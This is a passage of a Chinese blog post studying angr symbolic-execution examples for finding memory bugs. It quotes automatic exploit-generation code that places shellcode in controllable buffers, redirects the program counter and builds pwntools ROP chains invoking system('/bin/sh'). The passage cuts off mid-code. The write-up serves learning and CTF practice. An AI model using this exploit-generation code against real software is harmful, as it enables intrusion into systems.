stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>该例子主要是为了帮助学习寻找内存错误问题。</p></blockquote><p>​        该代码例子中出现：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">cfg <span class="token operator">=</span> project<span class="token punctuation">.</span>analyses<span class="token punctuation">.</span>CFG<span class="token punctuation">(</span>fail_fast<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将使得angr无视错误继续向下处理，一定程度上加快angr的分析速度。同时该例子其实利用了程序的特点，从argv进行参数的输入，然后利用对于strcpy参数的分析来判断strcpy的参数是否可控，进而判断是否具备发生漏洞的潜在可能。</p><p>​        这种思想的潜在推广就是对所有的内存处理函数进行推广，然后判断漏洞是否产生。</p><h3 id="CADET"><a href="#CADET" class="headerlink" title="CADET"></a>CADET</h3><p>​        这个是一个对于栈溢出的检测，这里得到了关于unconstrained state最直接的解释：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#overwriting the return pointer with user-controllable data will generate#an "unconstrained" state: the symbolic executor does not know how to proceed#since the instruction pointer can assume any value#by default angr discards unconstrained paths, so we need to specify the  #save_unconstrained option<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是angr默认情况下会丢弃unconstained path，因此在启动的时候需要进行设置：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">sm <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>save_unconstrained<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是这个例子存在一个问题就是，x86版本的例子直接通过step()是没办法直接获取到unconstrained状态的。其他的就没啥很特别的了。</p><h3 id="grub"><a href="#grub" class="headerlink" title="grub"></a>grub</h3><p>​        这个用到了特殊的库，先看一个文档提示：</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>if <code>auto_load_libs</code> is <code>False</code>, then external functions are unresolved, and Project will resolve them to a generic “stub” SimProcedure called <code>ReturnUnconstrained</code>. It does what its name says: it returns a unique unconstrained symbolic value each time it is called.</p></blockquote><p>在准备阶段，作者做的很好：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'crypto.mod'</span><span class="token punctuation">,</span> auto_load_libs<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token comment"># use libc functions as stand-ins for grub functions</span>memset <span class="token operator">=</span> angr<span class="token punctuation">.</span>SIM_PROCEDURES<span class="token punctuation">[</span><span class="token string">'libc'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'memset'</span><span class="token punctuation">]</span>getchar <span class="token operator">=</span> angr<span class="token punctuation">.</span>SIM_PROCEDURES<span class="token punctuation">[</span><span class="token string">'libc'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'getchar'</span><span class="token punctuation">]</span>do_nothing <span class="token operator">=</span> angr<span class="token punctuation">.</span>SIM_PROCEDURES<span class="token punctuation">[</span><span class="token string">'stubs'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ReturnUnconstrained'</span><span class="token punctuation">]</span>project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'grub_memset'</span><span class="token punctuation">,</span> memset<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'grub_getkey'</span><span class="token punctuation">,</span> getchar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># I don't know why, but grub_xputs is apparently not the function but a pointer to it?</span>xputs_pointer_addr <span class="token operator">=</span> project<span class="token punctuation">.</span>loader<span class="token punctuation">.</span>find_symbol<span class="token punctuation">(</span><span class="token string">'grub_xputs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rebased_addrxputs_func_addr <span class="token operator">=</span> project<span class="token punctuation">.</span>loader<span class="token punctuation">.</span>extern_object<span class="token punctuation">.</span>allocate<span class="token punctuation">(</span><span class="token punctuation">)</span>project<span class="token punctuation">.</span>hook<span class="token punctuation">(</span>xputs_func_addr<span class="token punctuation">,</span> do_nothing<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>project<span class="token punctuation">.</span>loader<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>pack_word<span class="token punctuation">(</span>xputs_pointer_addr<span class="token punctuation">,</span> xputs_func_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​        这里作者直接对目标函数进行了hook使得他们在模拟执行的时候可以正常运行，然后自写了angr的探索策略，通过直接对目标函数进行模拟的方法来进行漏洞挖掘。最后调用的是find_bug来解决问题，这里特殊的是利用了call_state来初始化状态。同时采用了use_technique的方法自写探索策略，他写的探索策略有一些优点，比如过滤了大量的重复状态，这极大的节省了符号执行过程中的性能消耗。</p><p>崩溃结果：input: b’\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\r’</p><p>原因：</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>根据你提供的输入，我们可以看到你输入了12个退格符(<code>\x08</code>)和一个回车符(<code>\r</code>)。在<code>grub_password_get</code>函数中，当输入的字符是退格符时，会将输入的指针回退一个字节（即向左移动一个字符）。因此，这个输入实际上是将初始缓冲区中的前11个字符删除掉，并在最后输入了一个回车符，表示输入结束。</p><p>在angr执行时，它尝试通过符号执行模拟这个函数的执行，它会在第一个循环迭代中执行<code>grub_getkey()</code>并获得输入的第一个字符。由于输入的第一个字符是退格符，它会将当前输入指针向左移动一个字符，并继续等待下一个输入字符。在第二次迭代中，angr又执行了<code>grub_getkey()</code>，但是由于输入指针已经被移动了一个字符，这个时候输入指针已经指向了地址0处。因此，在angr执行到地址0处时，会引发<code>SimUnsatError</code>异常，表示出现了不可满足的情况。这通常是由于符号执行过程中出现了不一致或无法解决的约束条件，导致无法继续进行符号执行。</p></blockquote><h3 id="Insomnihack-Simple-AEG"><a href="#Insomnihack-Simple-AEG" class="headerlink" title="Insomnihack Simple AEG"></a>Insomnihack Simple AEG</h3><p>​        这里面的demo是一个很简单的缓冲区溢出的漏洞（堆溢出），作者采用的方法是直接不断的对simgr 进行step()，直到目标出现不可约束状态，在找到不可约束状态之后对其是否可以符号化进行判断：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fully_symbolic</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> variable<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    check if a symbolic variable is completely symbolic    '''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>state<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>bits<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>symbolic<span class="token punctuation">(</span>variable<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样可以证明，目标状态的跳转地址是否可控，以此来判断目标是一个可控的漏洞，接下来就是判断能不能在这个状态里面找到用户可控的缓冲区：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">find_symbolic_buffer</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's    control    '''</span>    <span class="token comment"># get all the symbolic bytes from stdin</span>    stdin <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>stdin    sym_addrs <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token punctuation">]</span>    <span class="token keyword">for</span> _<span class="token punctuation">,</span> symbol <span class="token keyword">in</span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>get_variables<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> stdin<span class="token punctuation">.</span>ident<span class="token punctuation">)</span><span class="token punctuation">:</span>        sym_addrs<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>addrs_for_name<span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token builtin">iter</span><span class="token punctuation">(</span>symbol<span class="token punctuation">.</span>variables<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> addr <span class="token keyword">in</span> sym_addrs<span class="token punctuation">:</span>        <span class="token keyword">if</span> check_continuity<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> sym_addrs<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">yield</span> addr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后利用check_continuity来判断内存是否足够容纳shellcode:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">check_continuity</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span> addresses<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    dumb way of checking if the region at 'address' contains 'length' amount of controlled    memory.    '''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> address <span class="token operator">+</span> i <span class="token keyword">in</span> addresses<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不过，这里的话，我感觉直接用shellcode的最大长度判断不就可以了吗？不理解为啥要从最小长度开始遍历。不过这个不是重点，接下来找到地址之后对状态添加额外约束：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">l<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"found symbolic buffer at %#x"</span><span class="token punctuation">,</span> buf_addr<span class="token punctuation">)</span>memory <span class="token operator">=</span> ep<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>buf_addr<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>sc_bvv <span class="token operator">=</span> ep<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token comment"># check satisfiability of placing shellcode into the address</span><span class="token keyword">if</span> ep<span class="token punctuation">.</span>satisfiable<span class="token punctuation">(</span>extra_constraints<span class="token operator">=</span><span class="token punctuation">(</span>memory <span class="token operator">==</span> sc_bvv<span class="token punctuation">,</span>ep<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>pc <span class="token operator">==</span> buf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    l<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"found buffer for shellcode, completing exploit"</span><span class="token punctuation">)</span>    ep<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>memory <span class="token operator">==</span> sc_bvv<span class="token punctuation">)</span>    l<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"pointing pc towards shellcode buffer"</span><span class="token punctuation">)</span>    ep<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>ep<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>pc <span class="token operator">==</span> buf_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果状态可以满足这些约束，那么就将这些约束添加到状态里面进行求解，直接拿到了exp。但是也有一些缺陷，单单从是否跑出unconstrained state并且判断每一个bit是否可以符号化来判断是否存在可控的内存问题非常消耗性能。同时，还有一个非常致命的缺陷，那就是如果在符号执行的过程中很可能存在没有触发漏洞的情况。经典的例子就是，目标的缓冲区和目标写入的大小相近。这表明其实利用符号执行来直接进行漏洞挖掘其实非常困难。</p><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">check_mem_corruption</span><span class="token punctuation">(</span>simgr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>simgr<span class="token punctuation">.</span>unconstrained<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> path <span class="token keyword">in</span> simgr<span class="token punctuation">.</span>unconstrained<span class="token punctuation">:</span>            <span class="token keyword">if</span> path<span class="token punctuation">.</span>satisfiable<span class="token punctuation">(</span>extra_constraints<span class="token operator">=</span><span class="token punctuation">[</span>path<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>pc <span class="token operator">==</span> <span class="token string">b"CCCC"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                path<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>path<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>pc <span class="token operator">==</span> <span class="token string">b"CCCC"</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> path<span class="token punctuation">.</span>satisfiable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    simgr<span class="token punctuation">.</span>stashes<span class="token punctuation">[</span><span class="token string">'mem_corrupt'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                simgr<span class="token punctuation">.</span>stashes<span class="token punctuation">[</span><span class="token string">'unconstrained'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>remove<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                simgr<span class="token punctuation">.</span>drop<span class="token punctuation">(</span>stash<span class="token operator">=</span><span class="token string">'active'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> simgr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相比于之前的逐比特符号化判断+地址是否可控的形式，这样显然更加直接，但是缺点在于没有直接把shellcode考虑进去，不过加入shellcode的判断也确实太有针对性，不适合广泛利用，下面是一个demo：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token punctuation">,</span> argparse<span class="token punctuation">,</span> IPython<span class="token keyword">def</span> <span class="token function">check_mem_corruption</span><span class="token punctuation">(</span>simgr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>simgr<span class="token punctuation">.</span>unconstrained<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> path <span class="token keyword">in</span> simgr<span class="token punctuation">.</span>unconstrained<span class="token punctuation">:</span>            <span class="token keyword">if</span> path<span class="token punctuation">.</span>satisfiable<span class="token punctuation">(</span>extra_constraints<span class="token operator">=</span><span class="token punctuation">[</span>path<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>pc <span class="token operator">==</span> <span class="token string">b"CCCC"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                path<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>path<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>pc <span class="token operator">==</span> <span class="token string">b"CCCC"</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> path<span class="token punctuation">.</span>satisfiable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    simgr<span class="token punctuation">.</span>stashes<span class="token punctuation">[</span><span class="token string">'mem_corrupt'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                simgr<span class="token punctuation">.</span>stashes<span class="token punctuation">[</span><span class="token string">'unconstrained'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>remove<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                simgr<span class="token punctuation">.</span>drop<span class="token punctuation">(</span>stash<span class="token operator">=</span><span class="token string">'active'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> simgr<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"Binary"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"Start_Addr"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>args<span class="token punctuation">.</span>Binary<span class="token punctuation">)</span>    state <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>args<span class="token punctuation">.</span>Start_Addr<span class="token punctuation">)</span>        simgr <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>state<span class="token punctuation">,</span> save_unconstrained<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    simgr<span class="token punctuation">.</span>stashes<span class="token punctuation">[</span><span class="token string">'mem_corrupt'</span><span class="token punctuation">]</span>  <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>step_func<span class="token operator">=</span>check_mem_corruption<span class="token punctuation">)</span>    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Automatic-rop-chain-generation"><a href="#Automatic-rop-chain-generation" class="headerlink" title="Automatic rop chain generation"></a>Automatic rop chain generation</h3><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://github.com/ChrisTheCoolHut/Auto_rop_chain_generation">https://github.com/ChrisTheCoolHut/Auto_rop_chain_generation</a></p></blockquote><p>​        之前大多讲的是buffer over flow的内存问题的发现，但是rop chain的生成也十分的重要，不过比起问题的发现，这一块的内容可能还更为复杂一点，对于rop chain的构建，基本的步骤如下：</p><ol><li>gadget finding</li><li>gadget chaining</li><li>Constraint applying</li><li>state emulation</li></ol><p>如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_rop_chain</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    We're using a copy of the original state since we are applying    constraints one at a time and stepping through the state.    """</span>    state_copy <span class="token operator">=</span> state<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>    binary_name <span class="token operator">=</span> state<span class="token punctuation">.</span>project<span class="token punctuation">.</span>filename    pwntools_elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>binary_name<span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""    Here we're getting the ropchain bytes and rop chain object    that has the individual gadget addresses and values    """</span>    rop_object<span class="token punctuation">,</span> rop_chain <span class="token operator">=</span> generate_standard_rop_chain<span class="token punctuation">(</span>binary_name<span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""    Here we're running through the program state and setting    each gadget.    """</span>    user_input<span class="token punctuation">,</span> new_state <span class="token operator">=</span> do_64bit_rop_with_stepping<span class="token punctuation">(</span>        pwntools_elf<span class="token punctuation">,</span> rop_object<span class="token punctuation">,</span> rop_chain<span class="token punctuation">,</span> state_copy    <span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""    With our constraints set, our binary's STDIN    should now contain our entire overflow + ropchain!    """</span>    input_bytes <span class="token operator">=</span> new_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> input_bytes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经常打CTF的同学估计找到，对于rop chain的寻找和构建都可以利用<a href="https://docs.pwntools.com/en/stable/rop/rop.html">pwntools</a>的强大功能：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">generate_standard_rop_chain</span><span class="token punctuation">(</span>binary_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    context<span class="token punctuation">.</span>binary <span class="token operator">=</span> binary_path    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>binary_path<span class="token punctuation">)</span>    rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>elf<span class="token punctuation">)</span>    <span class="token comment"># These are strings we want to call</span>    strings <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b"/bin/sh\x00"</span><span class="token punctuation">,</span> <span class="token string">b"/bin/bash\x00"</span><span class="token punctuation">]</span>    functions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"execve"</span><span class="token punctuation">]</span>    <span class="token triple-quoted-string string">"""    The two main components we need in our rop chain    is either a system() or exec() call and a refernce    to the string we want to call (/bin/sh)    """</span>    ret_func <span class="token operator">=</span> <span class="token 